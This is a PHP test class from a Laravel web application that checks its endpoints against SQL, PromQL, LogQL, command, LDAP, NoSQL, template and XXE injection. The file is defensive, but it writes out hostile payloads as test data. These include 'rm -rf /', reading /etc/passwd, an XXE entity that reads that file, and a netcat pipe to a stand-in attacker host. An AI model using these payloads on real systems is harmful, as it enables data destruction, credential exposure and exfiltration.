<?php

declare(strict_types=1);

namespace Tests\Security;

use App\Models\Site;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Tests\Concerns\WithMockObservability;
use Tests\Concerns\WithSecurityTesting;
use Tests\TestCase;

/**
 * Test protection against injection attacks
 *
 * Tests SQL injection, PromQL injection, LogQL injection, and command injection
 * protection across all application entry points.
 */
class InjectionAttackTest extends TestCase
{
    use RefreshDatabase;
    use WithMockObservability;
    use WithSecurityTesting;

    protected User $user;

    protected function setUp(): void
    {
        parent::setUp();

        $this->user = User::factory()->create();
        $this->setUpObservabilityMocks();
    }

    /**
     * Test SQL injection protection in site search
     */
    public function test_sql_injection_protection_in_site_search(): void
    {
        Site::factory()->create(['tenant_id' => $this->user->currentTenant()->id, 'domain' => 'test.com']);

        $this->assertSqlInjectionProtection(function ($payload) {
            return $this->actingAs($this->user)
                ->get('/api/v1/sites?search='.urlencode($payload));
        });
    }

    /**
     * Test SQL injection protection in site creation
     */
    public function test_sql_injection_protection_in_site_creation(): void
    {
        $this->assertSqlInjectionProtection(function ($payload) {
            return $this->actingAs($this->user)
                ->post('/api/v1/sites', [
                    'domain' => $payload,
                    'type' => 'html',
                ]);
        });
    }

    /**
     * Test PromQL injection protection
     */
    public function test_promql_injection_protection(): void
    {
        $site = Site::factory()->create(['tenant_id' => $this->user->currentTenant()->id]);

        $maliciousQueries = [
            'up{job="test"} or vector(1)',
            'up or (up * 0) + 1',
            'metric{label=~".*"}',
        ];

        foreach ($maliciousQueries as $query) {
            $this->mockPromQLInjectionPrevention($query, 'up{job="safe"}');

            $response = $this->actingAs($this->user)
                ->post("/api/v1/sites/{$site->id}/metrics/query", [
                    'query' => $query,
                ]);

            $response->assertStatus(200);
            $this->assertQueryWasSanitized('prometheus');
        }
    }

    /**
     * Test LogQL injection protection
     */
    public function test_logql_injection_protection(): void
    {
        $site = Site::factory()->create(['tenant_id' => $this->user->currentTenant()->id]);

        $this->assertLogQLInjectionProtection(function ($payload) use ($site) {
            $this->mockLogQLInjectionPrevention($payload, '{job="safe"}');

            return $this->actingAs($this->user)
                ->post("/api/v1/sites/{$site->id}/logs/query", [
                    'query' => $payload,
                ])
                ->json();
        });
    }

    /**
     * Test command injection protection in site operations
     */
    public function test_command_injection_protection(): void
    {
        $site = Site::factory()->create(['tenant_id' => $this->user->currentTenant()->id]);

        $commandInjectionPayloads = [
            'domain.com; rm -rf /',
            'domain.com && cat /etc/passwd',
            'domain.com | nc attacker.com 1234',
            'domain.com`whoami`',
            'domain.com$(whoami)',
        ];

        foreach ($commandInjectionPayloads as $payload) {
            $response = $this->actingAs($this->user)
                ->put("/api/v1/sites/{$site->id}", [
                    'domain' => $payload,
                ]);

            // Should validate and reject
            $this->assertTrue(
                $response->status() === 422 || $response->status() === 400,
                "Command injection payload not rejected: {$payload}"
            );
        }
    }

    /**
     * Test LDAP injection protection (if LDAP is used)
     */
    public function test_ldap_injection_protection(): void
    {
        $ldapInjectionPayloads = [
            '*',
            '*)(&',
            '*)(|(objectClass=*',
            'admin)(&(password=*)',
        ];

        foreach ($ldapInjectionPayloads as $payload) {
            $response = $this->post('/login', [
                'email' => $payload,
                'password' => 'password',
            ]);

            // Should not cause LDAP errors
            $this->assertNotEquals(500, $response->status());
        }
    }

    /**
     * Test NoSQL injection protection (if MongoDB/similar used)
     */
    public function test_nosql_injection_protection(): void
    {
        $nosqlPayloads = [
            ['$gt' => ''],
            ['$ne' => null],
            ['$regex' => '.*'],
        ];

        foreach ($nosqlPayloads as $payload) {
            $response = $this->actingAs($this->user)
                ->get('/api/v1/sites?filter='.json_encode($payload));

            // Should sanitize or reject
            $this->assertTrue(
                in_array($response->status(), [200, 400, 422]),
                'NoSQL injection not handled properly'
            );
        }
    }

    /**
     * Test Server-Side Template Injection (SSTI) protection
     */
    public function test_template_injection_protection(): void
    {
        $sstiPayloads = [
            '{{7*7}}',
            '${7*7}',
            '<%= 7*7 %>',
            '#{7*7}',
        ];

        $site = Site::factory()->create(['tenant_id' => $this->user->currentTenant()->id]);

        foreach ($sstiPayloads as $payload) {
            $response = $this->actingAs($this->user)
                ->put("/api/v1/sites/{$site->id}", [
                    'description' => $payload,
                ]);

            $response->assertStatus(200);

            // Template should not be executed
            $site->refresh();
            $this->assertNotContains('49', $site->description);
        }
    }

    /**
     * Test XML injection/XXE protection
     */
    public function test_xml_injection_protection(): void
    {
        $xxePayload = '<?xml version="1.0"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <foo>&xxe;</foo>';

        $response = $this->actingAs($this->user)
            ->withHeader('Content-Type', 'application/xml')
            ->post('/api/v1/import', $xxePayload);

        // Should reject or sanitize
        $content = $response->getContent();
        $this->assertStringNotContainsString('root:', $content);
    }

    /**
     * Test protection against second-order SQL injection
     */
    public function test_second_order_sql_injection_protection(): void
    {
        // Store payload in database
        $site = Site::factory()->create([
            'user_id' => $this->user->id,
            'domain' => "test' OR '1'='1.com",
        ]);

        DB::enableQueryLog();

        // Use stored data in query
        $response = $this->actingAs($this->user)
            ->get("/api/v1/sites/{$site->id}");

        $response->assertStatus(200);

        // Check that queries used parameter binding
        $queries = DB::getQueryLog();
        foreach ($queries as $query) {
            $this->assertNotEmpty($query['bindings'], 'Query not using parameter binding');
        }
    }
}
